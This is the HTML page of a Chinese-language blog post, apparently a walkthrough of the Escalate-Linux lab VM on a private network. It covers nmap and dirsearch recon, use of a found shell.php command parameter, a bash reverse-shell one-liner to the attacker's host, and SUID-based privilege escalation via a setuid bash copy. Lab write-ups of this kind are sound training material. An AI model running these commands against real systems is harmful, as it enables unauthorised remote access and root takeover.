@@ -1,0 +1,283 @@
+<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Escalate-Linux渗透 | usually885</title><meta name=keywords content><meta name=description content="信息收集
+1.主机存活探测
+sudo nmap -sn 192.168.159.0/24 
+## 扫描出来目标主机应该是192.168.159.133
+2.端口服务,默认脚本扫描探测
+└─$ nmap 192.168.159.133 -sV -sC -min-rate 2222 -r
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 11:57 +0800
+Nmap scan report for 192.168.159.133
+Host is up (0.000086s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      33443/tcp6  mountd
+|   100005  1,2,3      34643/tcp   mountd
+|   100005  1,2,3      38995/udp   mountd
+|   100005  1,2,3      47250/udp6  mountd
+|   100021  1,3,4      32908/udp   nlockmgr
+|   100021  1,3,4      41249/tcp6  nlockmgr
+|   100021  1,3,4      46353/tcp   nlockmgr
+|   100021  1,3,4      52118/udp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs         3-4 (RPC #100003)
+MAC Address: 00:0C:29:DD:64:D7 (VMware)
+Service Info: Host: LINUX
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2026-07-01T03:57:52
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: osboxes
+|   NetBIOS computer name: LINUX\x00
+|   Domain name: \x00
+|   FQDN: osboxes
+|_  System time: 2026-06-30T23:57:52-04:00
+|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds
+扫描结果主要是smba/nfs文件共享这方面的，80端口并没有什么用处，对网站做一个目录扫描"><meta name=author content><link rel=canonical href=https://usually885.github.io/usually-blog/posts/escalate-linux/><link crossorigin=anonymous href=/usually-blog/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as=style><link rel=icon href=https://usually885.github.io/usually-blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://usually885.github.io/usually-blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://usually885.github.io/usually-blog/favicon-32x32.png><link rel=apple-touch-icon href=https://usually885.github.io/usually-blog/apple-touch-icon.png><link rel=mask-icon href=https://usually885.github.io/usually-blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://usually885.github.io/usually-blog/posts/escalate-linux/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://usually885.github.io/usually-blog/posts/escalate-linux/"><meta property="og:site_name" content="usually885"><meta property="og:title" content="Escalate-Linux渗透"><meta property="og:description" content="信息收集 1.主机存活探测
+sudo nmap -sn 192.168.159.0/24 ## 扫描出来目标主机应该是192.168.159.133 2.端口服务,默认脚本扫描探测
+└─$ nmap 192.168.159.133 -sV -sC -min-rate 2222 -rStarting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 11:57 +0800Nmap scan report for 192.168.159.133Host is up (0.000086s latency).Not shown: 995 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 33443/tcp6 mountd| 100005 1,2,3 34643/tcp mountd| 100005 1,2,3 38995/udp mountd| 100005 1,2,3 47250/udp6 mountd| 100021 1,3,4 32908/udp nlockmgr| 100021 1,3,4 41249/tcp6 nlockmgr| 100021 1,3,4 46353/tcp nlockmgr| 100021 1,3,4 52118/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)2049/tcp open nfs 3-4 (RPC #100003)MAC Address: 00:0C:29:DD:64:D7 (VMware)Service Info: Host: LINUXHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2026-07-01T03:57:52|_ start_date: N/A| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: osboxes| NetBIOS computer name: LINUX\x00| Domain name: \x00| FQDN: osboxes|_ System time: 2026-06-30T23:57:52-04:00|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds 扫描结果主要是smba/nfs文件共享这方面的，80端口并没有什么用处，对网站做一个目录扫描"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-07-03T01:45:19+08:00"><meta property="article:modified_time" content="2026-07-03T01:45:19+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Escalate-Linux渗透"><meta name=twitter:description content="信息收集 1.主机存活探测
+sudo nmap -sn 192.168.159.0/24 ## 扫描出来目标主机应该是192.168.159.133 2.端口服务,默认脚本扫描探测
+└─$ nmap 192.168.159.133 -sV -sC -min-rate 2222 -rStarting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 11:57 +0800Nmap scan report for 192.168.159.133Host is up (0.000086s latency).Not shown: 995 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 33443/tcp6 mountd| 100005 1,2,3 34643/tcp mountd| 100005 1,2,3 38995/udp mountd| 100005 1,2,3 47250/udp6 mountd| 100021 1,3,4 32908/udp nlockmgr| 100021 1,3,4 41249/tcp6 nlockmgr| 100021 1,3,4 46353/tcp nlockmgr| 100021 1,3,4 52118/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)2049/tcp open nfs 3-4 (RPC #100003)MAC Address: 00:0C:29:DD:64:D7 (VMware)Service Info: Host: LINUXHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2026-07-01T03:57:52|_ start_date: N/A| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: osboxes| NetBIOS computer name: LINUX\x00| Domain name: \x00| FQDN: osboxes|_ System time: 2026-06-30T23:57:52-04:00|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds 扫描结果主要是smba/nfs文件共享这方面的，80端口并没有什么用处，对网站做一个目录扫描"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://usually885.github.io/usually-blog/posts/"},{"@type":"ListItem","position":2,"name":"Escalate-Linux渗透","item":"https://usually885.github.io/usually-blog/posts/escalate-linux/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Escalate-Linux渗透","name":"Escalate-Linux渗透","description":"信息收集 1.主机存活探测\nsudo nmap -sn 192.168.159.0/24 ## 扫描出来目标主机应该是192.168.159.133 2.端口服务,默认脚本扫描探测\n└─$ nmap 192.168.159.133 -sV -sC -min-rate 2222 -r\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 11:57 +0800\rNmap scan report for 192.168.159.133\rHost is up (0.000086s latency).\rNot shown: 995 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.29 (Ubuntu)\r111/tcp open rpcbind 2-4 (RPC #100000)\r| rpcinfo: | program version port/proto service\r| 100000 2,3,4 111/tcp rpcbind\r| 100000 2,3,4 111/udp rpcbind\r| 100000 3,4 111/tcp6 rpcbind\r| 100000 3,4 111/udp6 rpcbind\r| 100003 3 2049/udp nfs\r| 100003 3 2049/udp6 nfs\r| 100003 3,4 2049/tcp nfs\r| 100003 3,4 2049/tcp6 nfs\r| 100005 1,2,3 33443/tcp6 mountd\r| 100005 1,2,3 34643/tcp mountd\r| 100005 1,2,3 38995/udp mountd\r| 100005 1,2,3 47250/udp6 mountd\r| 100021 1,3,4 32908/udp nlockmgr\r| 100021 1,3,4 41249/tcp6 nlockmgr\r| 100021 1,3,4 46353/tcp nlockmgr\r| 100021 1,3,4 52118/udp6 nlockmgr\r| 100227 3 2049/tcp nfs_acl\r| 100227 3 2049/tcp6 nfs_acl\r| 100227 3 2049/udp nfs_acl\r|_ 100227 3 2049/udp6 nfs_acl\r139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\r2049/tcp open nfs 3-4 (RPC #100003)\rMAC Address: 00:0C:29:DD:64:D7 (VMware)\rService Info: Host: LINUX\rHost script results:\r| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required\r|_nbstat: NetBIOS name: LINUX, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown)\r| smb-security-mode: | account_used: guest\r| authentication_level: user\r| challenge_response: supported\r|_ message_signing: disabled (dangerous, but default)\r| smb2-time: | date: 2026-07-01T03:57:52\r|_ start_date: N/A\r| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\r| Computer name: osboxes\r| NetBIOS computer name: LINUX\\x00\r| Domain name: \\x00\r| FQDN: osboxes\r|_ System time: 2026-06-30T23:57:52-04:00\r|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.29 seconds 扫描结果主要是smba/nfs文件共享这方面的，80端口并没有什么用处，对网站做一个目录扫描\n","keywords":[],"articleBody":"信息收集 1.主机存活探测\nsudo nmap -sn 192.168.159.0/24 ## 扫描出来目标主机应该是192.168.159.133 2.端口服务,默认脚本扫描探测\n└─$ nmap 192.168.159.133 -sV -sC -min-rate 2222 -r\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 11:57 +0800\rNmap scan report for 192.168.159.133\rHost is up (0.000086s latency).\rNot shown: 995 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.29 (Ubuntu)\r111/tcp open rpcbind 2-4 (RPC #100000)\r| rpcinfo: | program version port/proto service\r| 100000 2,3,4 111/tcp rpcbind\r| 100000 2,3,4 111/udp rpcbind\r| 100000 3,4 111/tcp6 rpcbind\r| 100000 3,4 111/udp6 rpcbind\r| 100003 3 2049/udp nfs\r| 100003 3 2049/udp6 nfs\r| 100003 3,4 2049/tcp nfs\r| 100003 3,4 2049/tcp6 nfs\r| 100005 1,2,3 33443/tcp6 mountd\r| 100005 1,2,3 34643/tcp mountd\r| 100005 1,2,3 38995/udp mountd\r| 100005 1,2,3 47250/udp6 mountd\r| 100021 1,3,4 32908/udp nlockmgr\r| 100021 1,3,4 41249/tcp6 nlockmgr\r| 100021 1,3,4 46353/tcp nlockmgr\r| 100021 1,3,4 52118/udp6 nlockmgr\r| 100227 3 2049/tcp nfs_acl\r| 100227 3 2049/tcp6 nfs_acl\r| 100227 3 2049/udp nfs_acl\r|_ 100227 3 2049/udp6 nfs_acl\r139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\r2049/tcp open nfs 3-4 (RPC #100003)\rMAC Address: 00:0C:29:DD:64:D7 (VMware)\rService Info: Host: LINUX\rHost script results:\r| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required\r|_nbstat: NetBIOS name: LINUX, NetBIOS user: , NetBIOS MAC: (unknown)\r| smb-security-mode: | account_used: guest\r| authentication_level: user\r| challenge_response: supported\r|_ message_signing: disabled (dangerous, but default)\r| smb2-time: | date: 2026-07-01T03:57:52\r|_ start_date: N/A\r| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\r| Computer name: osboxes\r| NetBIOS computer name: LINUX\\x00\r| Domain name: \\x00\r| FQDN: osboxes\r|_ System time: 2026-06-30T23:57:52-04:00\r|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.29 seconds 扫描结果主要是smba/nfs文件共享这方面的，80端口并没有什么用处，对网站做一个目录扫描\n─$ dirsearch -u http://192.168.159.133/ /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460\rOutput File: /home/usually/reports/http_192.168.159.133/__26-07-01_12-07-47.txt\rTarget: http://192.168.159.133/\r[12:07:47] Starting: [12:07:48] 403 - 301B - /.ht_wsr.txt [12:07:48] 403 - 304B - /.htaccess.orig [12:07:48] 403 - 304B - /.htaccess.bak1\r[12:07:48] 403 - 306B - /.htaccess.sample [12:07:48] 403 - 304B - /.htaccess.save [12:07:48] 403 - 304B - /.htaccess_orig [12:07:48] 403 - 305B - /.htaccess_extra\r[12:07:48] 403 - 302B - /.htaccess_sc\r[12:07:48] 403 - 302B - /.htaccessOLD\r[12:07:48] 403 - 303B - /.htaccessOLD2 [12:07:48] 403 - 302B - /.htaccessBAK\r[12:07:48] 403 - 294B - /.htm [12:07:48] 403 - 295B - /.html\r[12:07:48] 403 - 304B - /.htpasswd_test [12:07:48] 403 - 301B - /.httr-oauth [12:07:48] 403 - 300B - /.htpasswds\r[12:07:49] 403 - 294B - /.php [12:08:05] 403 - 303B - /server-status [12:08:05] 403 - 304B - /server-status/\r[12:08:05] 200 - 29B - /shell.php Task Completed 漏洞发现 这边扫描出来了一个shell.php文件，去访问一看，是要我们传递一个参数给cmd\n发现这个确实能用\n现在做一些相关的信息收集出来，\nuname -a:Linux osboxes 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\rwhoami:user6\rpwd:/var/www/html ## 当前网站目录下应该是没有权限创建文件编写的，测试了一下网站不可以访问其他的文件资源 反弹shell 到这里写入一句话木马应该是不行的，现在尝试一下反弹shell，这里反弹shell所需要用到的命令放到这里是会被url编码转义的，需要提前对这个命令进行编码\nbash -c 'bash -i \u003e\u0026 /dev/tcp/192.168.159.128/5000 0\u003e\u00261' 编码这个传入给参数cmd拿到反弹shell\n现在通过shell进行新一轮的信息收集 这里首先去看有没有sudo权限，sudo -l\n提示这个好像是因为这个shell太残次了，弹出输入密码不行。 这个时候我看到的思路就可以去通过python升级成完整的交互式shell，但是现在这里是不行的\nls -la ~ 查看当前家目录用户的文件详情 cat /etc/group cat /etc/crontab 查询 系统级定时任务配置文件（cron 表） 这里查询看到一个每五分种自动执行的一个脚本，然后查询了这个文件权限是只读的，这里没招了\n4.查找suid提权文件\nfind / -perm -u=s -type f 2\u003e/dev/null 从 / 根目录开始，全盘查找 带有 SUID 权限的普通文件，并隐藏没有权限访问时产生的错误信息。\n这里看到一个直接叫shell的文件，到该目录查看一下文件权限\n这里意外惊喜看到一个script.sh的文件，这个权限是所有人都是root权限\nsuid提权 通过写入我们找到的这个.script.sh文件提权脚本进去，suid执行就能直接提权成功\n恶意脚本\ncp /bin/bash /tmp/sh\rchmod +s /tmp/sh 现在确实成功写进去了这个脚本，但是我们自己执行是没有什么用处的，需要root权限的用户执行的才能让我们通过suid提权成功，这里需要往回走一点，我们之前看到的shell这个脚本，\nstrings shell /lib64/ld-linux-x86-64.so.2\r{X","wordCount":"701","inLanguage":"en","datePublished":"2026-07-03T01:45:19+08:00","dateModified":"2026-07-03T01:45:19+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://usually885.github.io/usually-blog/posts/escalate-linux/"},"publisher":{"@type":"Organization","name":"usually885","logo":{"@type":"ImageObject","url":"https://usually885.github.io/usually-blog/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=header-nav><div class=logo><a href=https://usually885.github.io/usually-blog/ accesskey=h title="usually885 (Alt + H)">usually885</a><div class=logo-switches><button id=theme-toggle class=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg class="moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu class=menu><li><a href=https://usually885.github.io/usually-blog/posts/ title=博客><span>博客</span></a></li><li><a href=https://usually885.github.io/usually-blog/about/ title=关于><span>关于</span></a></li><li><a href=https://usually885.github.io/usually-blog/guestbook/ title=Guestbook><span>Guestbook</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Escalate-Linux渗透</h1><div class=post-meta><span title='2026-07-03 01:45:19 +0800 CST'>2026-07-03</span>&nbsp;·&nbsp;<span>4 min</span></div></header><div class="post-content md-content"><h2 id=信息收集>信息收集<a hidden class=anchor aria-hidden=true href=#信息收集>#</a></h2><p>1.主机存活探测</p><pre tabindex=0><code>sudo nmap -sn 192.168.159.0/24 
+## 扫描出来目标主机应该是192.168.159.133
+</code></pre><p>2.端口服务,默认脚本扫描探测</p><pre tabindex=0><code>└─$ nmap 192.168.159.133 -sV -sC -min-rate 2222 -r
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 11:57 +0800
+Nmap scan report for 192.168.159.133
+Host is up (0.000086s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      33443/tcp6  mountd
+|   100005  1,2,3      34643/tcp   mountd
+|   100005  1,2,3      38995/udp   mountd
+|   100005  1,2,3      47250/udp6  mountd
+|   100021  1,3,4      32908/udp   nlockmgr
+|   100021  1,3,4      41249/tcp6  nlockmgr
+|   100021  1,3,4      46353/tcp   nlockmgr
+|   100021  1,3,4      52118/udp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs         3-4 (RPC #100003)
+MAC Address: 00:0C:29:DD:64:D7 (VMware)
+Service Info: Host: LINUX
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: LINUX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2026-07-01T03:57:52
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: osboxes
+|   NetBIOS computer name: LINUX\x00
+|   Domain name: \x00
+|   FQDN: osboxes
+|_  System time: 2026-06-30T23:57:52-04:00
+|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds
+</code></pre><p>扫描结果主要是smba/nfs文件共享这方面的，80端口并没有什么用处，对网站做一个目录扫描</p><pre tabindex=0><code>─$ dirsearch -u http://192.168.159.133/           
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           
+ (_||| _) (/_(_|| (_| )                                                                                                                                    
+                                                                                                                                                           
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/usually/reports/http_192.168.159.133/__26-07-01_12-07-47.txt
+
+Target: http://192.168.159.133/
+
+[12:07:47] Starting:                                                                                                                                       
+[12:07:48] 403 -  301B  - /.ht_wsr.txt                                      
+[12:07:48] 403 -  304B  - /.htaccess.orig                                   
+[12:07:48] 403 -  304B  - /.htaccess.bak1
+[12:07:48] 403 -  306B  - /.htaccess.sample                                 
+[12:07:48] 403 -  304B  - /.htaccess.save                                   
+[12:07:48] 403 -  304B  - /.htaccess_orig                                   
+[12:07:48] 403 -  305B  - /.htaccess_extra
+[12:07:48] 403 -  302B  - /.htaccess_sc
+[12:07:48] 403 -  302B  - /.htaccessOLD
+[12:07:48] 403 -  303B  - /.htaccessOLD2                                    
+[12:07:48] 403 -  302B  - /.htaccessBAK
+[12:07:48] 403 -  294B  - /.htm                                             
+[12:07:48] 403 -  295B  - /.html
+[12:07:48] 403 -  304B  - /.htpasswd_test                                   
+[12:07:48] 403 -  301B  - /.httr-oauth                                      
+[12:07:48] 403 -  300B  - /.htpasswds
+[12:07:49] 403 -  294B  - /.php                                             
+[12:08:05] 403 -  303B  - /server-status                                    
+[12:08:05] 403 -  304B  - /server-status/
+[12:08:05] 200 -   29B  - /shell.php                                        
+                                                                             
+Task Completed        
+</code></pre><h2 id=漏洞发现>漏洞发现<a hidden class=anchor aria-hidden=true href=#漏洞发现>#</a></h2><p>这边扫描出来了一个shell.php文件，去访问一看，是要我们传递一个参数给cmd</p><p><img src=/usually-blog/posts/escalate-linux/image-20260701120950708.png alt=image-20260701120950708></p><p>发现这个确实能用</p><p>现在做一些相关的信息收集出来，</p><pre tabindex=0><code>uname -a:Linux osboxes 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+whoami:user6
+pwd:/var/www/html 
+## 当前网站目录下应该是没有权限创建文件编写的，测试了一下网站不可以访问其他的文件资源
+</code></pre><h2 id=反弹shell>反弹shell<a hidden class=anchor aria-hidden=true href=#反弹shell>#</a></h2><p>到这里写入一句话木马应该是不行的，现在尝试一下反弹shell，这里反弹shell所需要用到的命令放到这里是会被url编码转义的，需要提前对这个命令进行编码</p><pre tabindex=0><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.159.128/5000 0&gt;&amp;1&#39;
+</code></pre><p>编码这个传入给参数cmd拿到反弹shell</p><h3 id=现在通过shell进行新一轮的信息收集>现在通过shell进行新一轮的信息收集<a hidden class=anchor aria-hidden=true href=#现在通过shell进行新一轮的信息收集>#</a></h3><p>这里首先去看有没有sudo权限，sudo -l</p><p><img src=/usually-blog/posts/escalate-linux/image-20260703001911036.png alt=image-20260703001911036></p><p>提示这个好像是因为这个shell太残次了，弹出输入密码不行。 这个时候我看到的思路就可以去通过python升级成完整的交互式shell，但是现在这里是不行的</p><ol><li>ls -la ~ 查看当前家目录用户的文件详情</li></ol><p><img src=/usually-blog/posts/escalate-linux/image-20260702213709134.png alt=image-20260702213709134></p><ol start=2><li>cat /etc/group</li><li>cat /etc/crontab 查询 <strong>系统级定时任务配置文件（cron 表）</strong></li></ol><p><img src=/usually-blog/posts/escalate-linux/image-20260703002613477.png alt=image-20260703002613477></p><p>这里查询看到一个每五分种自动执行的一个脚本，然后查询了这个文件权限是只读的，这里没招了</p><p>4.查找suid提权文件</p><pre tabindex=0><code>find / -perm -u=s -type f 2&gt;/dev/null
